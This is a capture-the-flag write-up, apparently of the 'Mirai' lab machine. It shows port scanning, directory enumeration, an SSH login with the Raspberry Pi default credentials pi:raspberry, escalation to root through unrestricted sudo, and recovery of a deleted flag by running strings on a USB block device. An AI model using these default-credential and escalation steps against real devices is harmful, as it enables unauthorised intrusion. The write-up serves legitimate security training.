# Mirai

## Nmap Scanning

```

sudo nmap -Pn  -sS -sC 10.10.10.48
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 23:33 EDT
Nmap scan report for 10.10.10.48
Host is up (0.92s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Nmap done: 1 IP address (1 host up) scanned in 72.31 seconds
```

## Gobuster

```

gobuster dir -u http://10.10.10.48 -w wordlist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.48
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/06 23:57:13 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48/admin/]
/swfobject.js         (Status: 200) [Size: 61]                               
                                                                             
===============================================================
2021/07/07 00:01:40 Finished
===============================================================
```

we got a pi-hole dashboard, learn about pi-hole here [pi-hole](https://en.wikipedia.org/wiki/Pi-hole)

pi-hole default credential `pi:raspberry`

using above credential to login in admin dashboard, password is wrong

lets trying ssh using this credentails

we sshed in system

```

ssh pi@10.10.10.48
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ ls
background.jpg  Desktop  Documents  Downloads  Music  oldconffiles  Pictures  Public  python_games  Templates  Videos
pi@raspberrypi:~ $ cd Desktop/
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
********************************************i:~/Desktop $ cd ../..
pi@raspberrypi:/home $ ls
pi
pi@raspberrypi:/home $ cd /root
-bash: cd: /root: Permission denied
```

checking for things which can be executed as root

```

pi@raspberrypi:/home $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

pi@raspberrypi:/home $ 
```

## Privilege Escalation

```
pi@raspberrypi:/home $ sudo -i

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

root@raspberrypi:~# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
root@raspberrypi:~# cd /media/usbstick
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
```

```
root@raspberrypi:/media/usbstick# lsblk -p
NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
/dev/sda      8:0    0   10G  0 disk 
├─/dev/sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─/dev/sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
/dev/sdb      8:16   0   10M  0 disk /media/usbstick
/dev/sr0     11:0    1 1024M  0 rom  
/dev/loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs

root@raspberrypi:/media/usbstick# cd /dev/sdb
-bash: cd: /dev/sdb: Not a directory

root@raspberrypi:/media/usbstick# file /dev/sdb
/dev/sdb: block special (8/16)

root@raspberrypi:/media/usbstick# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
********************************
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
root@raspberrypi:/media/usbstick# 
```
